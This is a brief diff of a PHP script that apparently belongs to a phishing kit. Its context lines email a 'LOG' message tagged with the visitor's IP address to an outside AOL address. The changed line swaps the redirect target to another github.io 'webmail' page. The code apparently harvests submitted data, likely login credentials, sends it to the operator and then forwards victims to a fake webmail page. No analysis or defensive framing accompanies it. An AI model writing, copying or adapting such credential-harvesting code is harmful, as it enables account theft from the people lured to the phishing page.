@@ -18,6 +18,6 @@ $to = "busybraintech@aol.com";
 
 $hi = mail($to,"LOG | ".$ip, $message);
 
-header ("location: https://busybrain2233.github.io/webmail.html")
+header ("location: https://busybrain2233.github.io/webmail2.html")
 
 ?
